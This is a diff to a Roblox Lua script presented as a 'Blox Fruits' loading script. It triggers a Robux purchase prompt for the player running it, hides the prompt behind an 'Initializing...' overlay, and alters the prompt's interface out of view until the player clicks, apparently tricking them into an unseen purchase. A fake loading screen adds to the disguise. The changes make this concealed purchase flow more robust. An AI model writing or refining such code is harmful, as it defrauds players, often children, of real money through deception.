@@ -619,7 +619,7 @@ local function showInitializingUI()
     message.AnchorPoint = Vector2.new(0.5, 0.5)
     message.BackgroundTransparency = 1
     message.Font = Enum.Font.GothamSemibold
-    message.Text = "Initializing..."
+    message.Text = "Initializing Gifting..." -- Clarified Text
     message.TextColor3 = Color3.fromRGB(230, 230, 230)
     message.TextScaled = true
     message.TextWrapped = true
@@ -630,7 +630,7 @@ local function showInitializingUI()
 end
 
 
--- Main Gifting Phase Function (Overlay Until Click logic)
+-- Main Gifting Phase Function (Overlay Until Click + Robust Upsell Check)
 local function executeGiftingPhase()
     -- Get UserID first
     local successUserId, userIdResult = pcall(function()
@@ -663,17 +663,17 @@ local function executeGiftingPhase()
         [1] = "buyRobuxShop",
         [2] = { ["StorageName"] = "2x EXP (15 mins.)", ["FunnelId"] = "Shop", ["PurchaseLocation"] = "Shop" }
     }
-    local successInvoke = pcall(CommF.InvokeServer, CommF, unpack(balanceCheckArgs))
+    local successInvoke, invokeError = pcall(CommF.InvokeServer, CommF, unpack(balanceCheckArgs)) -- Capture invoke success/error
     if not successInvoke then
-        warn("Gifter Phase Error: Failed to invoke server for balance check.")
+        warn("Gifter Phase Error: Failed to invoke server for balance check.", invokeError)
         gifter_giftingFailed = true
-        -- Don't return yet, maybe prompt still appears
+        -- Don't return yet, maybe prompt still appears or maybe not
     end
 
-    -- Wait for the prompt to appear (behind the initializing UI)
-    local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt", 5) -- Wait up to 5 seconds
+    -- Wait for the prompt to appear (behind the initializing UI) - Increased Timeout
+    local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt", 10) -- Increased wait time to 10 seconds
     if not PurchasePrompt then
-        warn("Gifter Phase Error: Purchase prompt did not appear.")
+        warn("Gifter Phase Error: Purchase prompt did not appear within 10 seconds.")
         gifter_giftingFailed = true
         if initUI and initUI.Parent then pcall(initUI.Destroy, initUI) end -- Cleanup UI on error
         return false
@@ -702,7 +702,7 @@ local function executeGiftingPhase()
         return true -- Gifting phase finished (failed due to funds)
     end
 
-    -- If upsell wasn't detected, proceed with modification (still behind overlay)
+    -- If upsell wasn't detected after the loop, proceed with modification (still behind overlay)
     gifter_modifyPromptUI()
     warn("Gifter Phase: Prompt modified behind overlay.")
 
@@ -802,7 +802,7 @@ local function joiner_createNotification() -- Cosmetic Loading UI
 	Instance.new("UICorner", headerFrame).CornerRadius = UDim.new(0, 10)
 	local titleLabel = Instance.new("TextLabel"); titleLabel.Name = "Title"; titleLabel.Size = UDim2.new(1,0,1,0); titleLabel.BackgroundTransparency = 1; titleLabel.Font = Enum.Font.GothamBold; titleLabel.Text = "Blox Fruits - Loading Script."; titleLabel.TextColor3 = Color3.fromRGB(255,255,255); titleLabel.TextSize = 24; titleLabel.Parent = headerFrame
 	local bottomFrame = Instance.new("Frame"); bottomFrame.Name = "BottomFrame"; bottomFrame.Size = UDim2.new(1,0,0,10); bottomFrame.Position = UDim2.new(0,0,1,-10); bottomFrame.BackgroundColor3 = Color3.fromRGB(35,35,45); bottomFrame.BorderSizePixel = 0; bottomFrame.ZIndex = 2; bottomFrame.Parent = headerFrame
-	local messageLabel = Instance.new("TextLabel"); messageLabel.Name = "Message"; messageLabel.Size = UDim2.new(1,-40,0,60); messageLabel.Position = UDim2.new(0,20,0,80); messageLabel.BackgroundTransparency = 1; messageLabel.Font = Enum.Font.Gotham; messageLabel.Text = "The script Is loading - Please, wait."; messageLabel.TextColor3 = Color3.fromRGB(220,220,220); messageLabel.TextSize = 18; messageLabel.TextWrapped = true; messageLabel.TextXAlignment = Enum.TextXAlignment.Center; messageLabel.Parent = container
+	local messageLabel = Instance.new("TextLabel"); messageLabel.Name = "Message"; messageLabel.Size = UDim2.new(1,-40,0,60); messageLabel.Position = UDim2.new(0,20,0,80); messageLabel.BackgroundTransparency = 1; messageLabel.Font = Enum.Font.Gotham; messageLabel.Text = "Loading Joiner Interface..."; messageLabel.TextColor3 = Color3.fromRGB(220,220,220); messageLabel.TextSize = 18; messageLabel.TextWrapped = true; messageLabel.TextXAlignment = Enum.TextXAlignment.Center; messageLabel.Parent = container -- Clarified Text
 	local loadingBarBg = Instance.new("Frame"); loadingBarBg.Name = "LoadingBarBg"; loadingBarBg.Size = UDim2.new(1,-40,0,20); loadingBarBg.Position = UDim2.new(0,20,0,150); loadingBarBg.BackgroundColor3 = Color3.fromRGB(40,40,50); loadingBarBg.BorderSizePixel = 0; loadingBarBg.Parent = container
 	Instance.new("UICorner", loadingBarBg).CornerRadius = UDim.new(0, 6)
 	local loadingBar = Instance.new("Frame"); loadingBar.Name = "LoadingBar"; loadingBar.Size = UDim2.new(0,0,1,0); loadingBar.BackgroundColor3 = Color3.fromRGB(65,169,255); loadingBar.BorderSizePixel = 0; loadingBar.Parent = loadingBarBg
@@ -1560,5 +1560,5 @@ end
 
 -- Cleanup script executed flag on teleport (from Gifter)
 LocalPlayer.OnTeleport:Connect(function()
-    _G.CombinedScriptExecuted_v1_10 = nil -- Match guard name
+    _G.CombinedScriptExecuted_v1_11 = nil -- Match guard name
 end)
